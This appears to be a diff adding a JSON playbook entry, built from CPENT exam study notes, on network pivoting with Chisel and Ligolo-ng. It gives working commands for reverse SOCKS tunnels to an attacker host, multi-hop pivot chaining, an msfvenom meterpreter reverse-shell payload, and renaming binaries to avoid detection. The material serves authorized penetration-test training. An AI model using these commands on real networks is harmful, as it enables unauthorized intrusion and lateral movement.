@@ -1,0 +1,167 @@
+{
+  "id": "pivoting-argha-dey-methodology",
+  "zone": "lateral-movement",
+  "name": "Argha Dey Pivoting & Tunneling Methodology",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "Chisel A-Z (server/client setup, local port forwarding, multi-pivot chaining) and Ligolo-ng A-Z (TUN interface, proxy/agent architecture, CLI + GUI/WebUI, multi-pivot). Includes comparison table and exam tips.",
+  "examHabits": [
+    "Always confirm dual-homed hosts first - run ifconfig/ip a on every pivot to find the second network leg",
+    "Use -sT (TCP connect scan), never -sS (SYN) through Ligolo-ng's TUN or proxychains - raw/SYN scans don't traverse tunnels",
+    "Always use -Pn with nmap when pivoting - ICMP echo often doesn't traverse the tunnel/SOCKS proxy",
+    "Document each pivot hop - IP addresses, tool used, command run, screenshot routing table (ip route) and session list",
+    "If Chisel is blocked/detected: prefer Ligolo-ng or rename/obfuscate binaries, fall back to native SSH -R/-D or plink.exe",
+    "Clean up: kill agents (agent_kill), remove routes (route_del), delete tun interfaces (interface_delete), stop chisel processes",
+    "When double/triple pivoting: create a NEW distinct tun interface name per hop (ligolo, ligolo-double, ligolo-triple) to avoid route collisions",
+    "If only ONE service needed (RDP/SMB): Chisel local/remote port-forward is faster than full Ligolo tunnel",
+    "If enumerating/attacking MANY hosts across a subnet: Ligolo-ng is faster and less error-prone than proxychains + Chisel"
+  ],
+  "quickRef": "CHISEL: chisel server -p 8000 --reverse (attacker); ./chisel client <kali>:8000 R:socks (pivot); proxychains nmap -sT -Pn 172.16.1.0/24 | LIGOLO: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ./proxy -selfcert -laddr 0.0.0.0:11601; ./agent -connect <kali>:11601 -ignore-cert; route_add + tunnel_start",
+  "steps": [
+    {
+      "phase": "Stage 1 - Core Concepts",
+      "techniques": [
+        "pivoting",
+        "double-pivot"
+      ],
+      "tools": [
+        "chisel",
+        "ligolo-ng",
+        "proxychains4",
+        "socat",
+        "ssh"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Understanding pivot vs tunnel",
+          "action": "Pivoting = strategy (using compromised host to reach internal network); Tunneling = mechanism (encapsulated channel over HTTP/HTTPS/SSH/DNS to bypass firewalls/ACLs)",
+          "fallback": "Port forwarding = specific technique of tunneling (local: ssh -L; remote: ssh -R; dynamic SOCKS: ssh -D)"
+        },
+        {
+          "condition": "Single vs Multi-pivot needed",
+          "action": "Single: Attacker \u2192 Pivot1 \u2192 Network A. Double: Attacker \u2192 Pivot1 \u2192 Pivot2 \u2192 Network B. Multi: N hops chained",
+          "fallback": "Identify by counting network segments between attacker and final target"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 2 - Chisel (A to Z)",
+      "techniques": [
+        "pivoting"
+      ],
+      "tools": [
+        "chisel",
+        "proxychains4",
+        "nmap"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Single pivot - need SOCKS proxy",
+          "action": "Attacker: chisel server -p 8000 --reverse. Pivot: ./chisel client <kali-ip>:8000 R:socks. Configure proxychains: echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf. proxychains nmap -sT -Pn <internal-range>",
+          "fallback": "If proxychains breaks tools: use Chisel local forward R:3389:172.16.1.20:3389 then connect directly"
+        },
+        {
+          "condition": "Multi-pivot needed (double/triple pivot)",
+          "action": "On Pivot1: run second chisel server --reverse --socks5 listening on internal iface; on Pivot2: connect to Pivot1 with R:socks; on attacker: chain proxychains config with two SOCKS entries (port 1080 for 172.16.x, port 1081 for 192.168.50.x)",
+          "fallback": "Option A recommended: chisel server -p 9000 --reverse --socks5 on Pivot1; ./chisel client 172.16.1.10:9000 R:socks on Pivot2; relay up via ./chisel client <kali>:8000 R:socks R:1081:127.0.0.1:1080"
+        },
+        {
+          "condition": "OPSEC / exam hardening needed",
+          "action": "Add --auth user:pass; --tls-skip-verify; --fingerprint <hash> to verify server cert (prevents MITM); --keepalive 25s to survive idle firewalls",
+          "fallback": "Standard: echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 3 - Ligolo-ng (A to Z, CLI)",
+      "techniques": [
+        "pivoting",
+        "double-pivot"
+      ],
+      "tools": [
+        "ligolo-ng",
+        "nmap",
+        "ip"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Single pivot - TUN setup",
+          "action": "1. sudo ip tuntap add user $(whoami) mode tun ligolo + sudo ip link set ligolo up (or interface_create --name ligolo in proxy CLI). 2. sudo ./proxy -selfcert -laddr 0.0.0.0:11601. 3. ./agent -connect <kali>:11601 -ignore-cert (or -accept-fingerprint <HASH>). 4. session \u2192 ifconfig \u2192 route_add --route 172.16.1.0/24 \u2192 tunnel_start --tun ligolo",
+          "fallback": "Use autoroute to auto-detect all agent routes"
+        },
+        {
+          "condition": "No proxychains needed - direct access",
+          "action": "After tunnel_start: nmap -sT -Pn 172.16.1.0/24; smbclient, evil-winrm, xfreerdp all work directly (no proxychains)",
+          "fallback": "240.0.0.1 maps to pivot's 127.0.0.1 loopback services (curl http://240.0.0.1:8080)"
+        },
+        {
+          "condition": "Reverse shell / file transfer through tunnel",
+          "action": "[Agent] listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp; listener_list. Binds port 4444 on pivot, relays inbound to attacker through tunnel",
+          "fallback": "For meterpreter: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<pivot-ip> LPORT=4444 -f exe -o shell.exe; handler with LHOST=0.0.0.0 LPORT=4444"
+        },
+        {
+          "condition": "Double/triple pivot with Ligolo-ng",
+          "action": "1. Single pivot to Pivot1 up (route to 172.16.1.0/24). 2. Create 2nd TUN: sudo ip tuntap add user $(whoami) mode tun ligolo-double. 3. [Agent:pivot1] listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (relay new agents back). 4. ./agent -connect 172.16.1.10:11601 -ignore-cert on Pivot2. 5. session 2 \u2192 ifconfig \u2192 route_add --name ligolo-double --route 192.168.50.0/24 \u2192 tunnel_start --tun ligolo-double",
+          "fallback": "Triple pivot: repeat with ligolo-triple TUN, listener on Pivot2 forwarding to Pivot3"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 4 - Ligolo-ng GUI (WebUI)",
+      "techniques": [
+        "pivoting",
+        "double-pivot"
+      ],
+      "tools": [
+        "ligolo-ng"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Visual/team pivot needed",
+          "action": "sudo ./proxy -selfcert -webui (WebUI at http://localhost:8080); optional -webui-addr 0.0.0.0:9090. GUI mirrors CLI: agent visualization, topology map, route/tunnel/listener management",
+          "fallback": "Config file (config.yaml) to auto-start proxy+webui+preset routes/listeners: ./proxy -config config.yaml"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 5 - Chisel vs Ligolo-ng Comparison",
+      "techniques": [],
+      "tools": [],
+      "decisionPoints": [
+        {
+          "condition": "Choosing tool for exam scenario",
+          "action": "Chisel: HTTP/SSH tunnel + SOCKS5 proxy, needs proxychains, manual multi-pivot chaining. Ligolo-ng: TUN interface + gVisor, NO proxychains needed, native transparent multi-pivot via listener_add, has WebUI",
+          "fallback": "Chisel for quick single-hop; Ligolo-ng for full subnet enumeration and multi-pivot"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 6 - Session/Lifecycle Management & Cleanup",
+      "techniques": [
+        "pivoting"
+      ],
+      "tools": [
+        "ligolo-ng",
+        "chisel"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Cleaning up after pivot",
+          "action": "Ligolo: tunnel_list; tunnel_stop; route_list; route_del --name ligolo --route 172.16.1.0/24; listener_list; listener_stop <ID>; interface_delete --name 'ligolo-double'; agent_kill; kill. Chisel: kill chisel processes on both attacker and pivot",
+          "fallback": "Document each hop with: IP addresses, tool used, command run, screenshot of ip route and session list"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 7 - Cross-Platform Notes (Windows/Mac Attacker)",
+      "techniques": [],
+      "tools": [],
+      "decisionPoints": [
+        {
+          "condition": "Attacker is Windows (not Kali)",
+          "action": "Windows: netsh int ipv4 show interfaces; route add 172.16.1.0 mask 255.255.255.0 0.0.0.0 if [INTERFACE_IDX]. Use plink.exe for SSH tunneling instead of chisel binary",
+          "fallback": "macOS: sudo ifconfig utun4 alias 172.16.1.99 255.255.255.0; sudo route add -net 172.16.1.0/24 -interface utun4 (use utunX not ligolo)"
+        }
+      ]
+    }
+  ]
+}
